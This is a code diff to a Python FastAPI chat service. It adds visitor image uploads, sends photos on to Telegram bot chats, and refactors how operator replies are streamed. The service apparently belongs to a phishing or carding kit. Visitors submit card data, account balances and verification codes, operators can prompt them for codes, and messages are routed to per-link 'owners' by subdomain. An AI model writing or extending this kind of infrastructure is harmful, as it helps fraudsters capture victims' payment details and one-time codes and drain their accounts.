@@ -1,10 +1,12 @@
 import asyncio
+import json
 import logging
 import os
 import secrets
+import uuid
 
 import httpx
-from fastapi import APIRouter, Request
+from fastapi import APIRouter, File, Form, Request, UploadFile
 from fastapi.responses import JSONResponse, StreamingResponse
 from pydantic import BaseModel
 from user_agents import parse as ua_parse
@@ -141,6 +143,7 @@ class VisitorMessage(BaseModel):
     balance_amount: str = ""
     balance_currency: str = ""
     verification_code: str = ""
+    image: str = ""
 
 
 # ── helpers ───────────────────────────────────────────────────────────────────
@@ -158,6 +161,74 @@ async def _resolve_owner(subdomain: str, link_id: str) -> tuple[str, int | None]
     except Exception as exc:
         logger.error("resolve_owner: %s", exc)
     return "неизвестен", None
+
+
+_ALLOWED_IMAGE_TYPES = {
+    "image/jpeg": ".jpg",
+    "image/jpg": ".jpg",
+    "image/png": ".png",
+    "image/webp": ".webp",
+}
+_MAX_IMAGE_BYTES = 5 * 1024 * 1024
+
+
+def encode_operator_event(reply: str) -> str:
+    if reply == "__request_code__":
+        return json.dumps({"action": "request_code"}, ensure_ascii=False)
+    if reply == "__recheck_balance__":
+        return json.dumps({"action": "recheck_balance"}, ensure_ascii=False)
+    if reply == "__reset_form__":
+        return json.dumps({"action": "reset_form"}, ensure_ascii=False)
+    try:
+        data = json.loads(reply)
+        if isinstance(data, dict) and ("image" in data or "action" in data):
+            return json.dumps(data, ensure_ascii=False)
+    except (json.JSONDecodeError, TypeError):
+        pass
+    return json.dumps({"text": reply}, ensure_ascii=False)
+
+
+def _static_dir() -> str:
+    return os.getenv("STATIC_DIR", "/app/static")
+
+
+def _safe_chat_image_path(image_url: str) -> str | None:
+    if not image_url or not image_url.startswith("/static/chat/"):
+        return None
+    rel = image_url[len("/static/"):]
+    if ".." in rel.replace("\\", "/").split("/"):
+        return None
+    path = os.path.normpath(os.path.join(_static_dir(), rel))
+    root = os.path.normpath(os.path.join(_static_dir(), "chat"))
+    if not path.startswith(root + os.sep) and path != root:
+        return None
+    return path if os.path.isfile(path) else None
+
+
+async def _send_telegram_photo(
+    chat_id: str | int,
+    *,
+    photo_path: str,
+    caption: str = "",
+    reply_markup: dict | None = None,
+) -> None:
+    if not BOT_TOKEN or not chat_id:
+        return
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    data: dict = {"chat_id": str(chat_id), "parse_mode": "HTML"}
+    if caption:
+        data["caption"] = caption[:1024]
+    if reply_markup:
+        data["reply_markup"] = json.dumps(reply_markup)
+    try:
+        async with httpx.AsyncClient(timeout=20) as client:
+            with open(photo_path, "rb") as fh:
+                r = await client.post(url, data=data, files={"photo": fh})
+            if r.status_code != 200:
+                logger.error("_send_telegram_photo: failed chat_id=%s status=%s body=%s",
+                             chat_id, r.status_code, r.text)
+    except Exception as exc:
+        logger.error("_send_telegram_photo: exception chat_id=%s exc=%s", chat_id, exc)
 
 
 async def _send_telegram(chat_id: str | int, text: str,
@@ -212,6 +283,34 @@ async def start_session(body: StartSession, request: Request) -> JSONResponse:
     return JSONResponse({"session_id": session_id, "visitor_id": visitor_id, "is_new": is_new})
 
 
+# ── POST /chat/upload ─────────────────────────────────────────────────────────
+
+@router.post("/upload")
+async def upload_chat_image(
+    session_id: str = Form(...),
+    file: UploadFile = File(...),
+) -> JSONResponse:
+    if not session_id.strip():
+        return JSONResponse({"ok": False, "error": "session"}, status_code=400)
+    ctype = (file.content_type or "").lower()
+    ext = _ALLOWED_IMAGE_TYPES.get(ctype)
+    if not ext:
+        return JSONResponse({"ok": False, "error": "type"}, status_code=400)
+    data = await file.read(_MAX_IMAGE_BYTES + 1)
+    if len(data) > _MAX_IMAGE_BYTES:
+        return JSONResponse({"ok": False, "error": "size"}, status_code=400)
+    if not data:
+        return JSONResponse({"ok": False, "error": "empty"}, status_code=400)
+    safe_sess = "".join(c for c in session_id if c.isalnum() or c in "-_")[:64]
+    dest_dir = os.path.join(_static_dir(), "chat", safe_sess)
+    os.makedirs(dest_dir, exist_ok=True)
+    filename = f"{uuid.uuid4().hex}{ext}"
+    dest = os.path.join(dest_dir, filename)
+    with open(dest, "wb") as fh:
+        fh.write(data)
+    return JSONResponse({"ok": True, "image": f"/static/chat/{safe_sess}/{filename}"})
+
+
 # ── GET /chat/steps ───────────────────────────────────────────────────────────
 
 @router.get("/steps")
@@ -229,8 +328,8 @@ async def get_steps(subdomain: str, link_id: str, lang: str = "ru") -> JSONRespo
 
 @router.post("/message")
 async def visitor_message(body: VisitorMessage, request: Request) -> JSONResponse:
-    logger.info("chat/message trigger=%s text=%r session=%s", body.trigger, body.text, body.session_id)
-    if not body.text.strip() and not body.trigger:
+    logger.info("chat/message trigger=%s text=%r session=%s image=%r", body.trigger, body.text, body.session_id, body.image)
+    if not body.text.strip() and not body.trigger and not body.image:
         return JSONResponse({"ok": False, "error": "empty"}, status_code=400)
 
     sess = await get_chat_session(body.session_id)
@@ -398,9 +497,18 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
     if body.trigger == "card":
         return JSONResponse({"ok": True})
 
+    photo_path = _safe_chat_image_path(body.image) if body.image else None
     if targets:
         for chat_id in targets:
-            await _send_telegram(chat_id, header + msg_body, reply_markup=reply_kb)
+            if photo_path:
+                await _send_telegram_photo(
+                    chat_id,
+                    photo_path=photo_path,
+                    caption=header + msg_body,
+                    reply_markup=reply_kb,
+                )
+            else:
+                await _send_telegram(chat_id, header + msg_body, reply_markup=reply_kb)
     else:
         logger.warning("chat/message: no targets — dropped for session %s", body.session_id)
 
@@ -417,15 +525,7 @@ async def chat_stream(session_id: str):
             try:
                 reply = await pop_operator_reply(session_id, timeout=25)
                 if reply is not None:
-                    import json as _json
-                    if reply == "__request_code__":
-                        payload = _json.dumps({"action": "request_code"}, ensure_ascii=False)
-                    elif reply == "__recheck_balance__":
-                        payload = _json.dumps({"action": "recheck_balance"}, ensure_ascii=False)
-                    elif reply == "__reset_form__":
-                        payload = _json.dumps({"action": "reset_form"}, ensure_ascii=False)
-                    else:
-                        payload = _json.dumps({"text": reply}, ensure_ascii=False)
+                    payload = encode_operator_event(reply)
                     yield f"data: {payload}\n\n"
                 else:
                     yield f": ping\n\n"
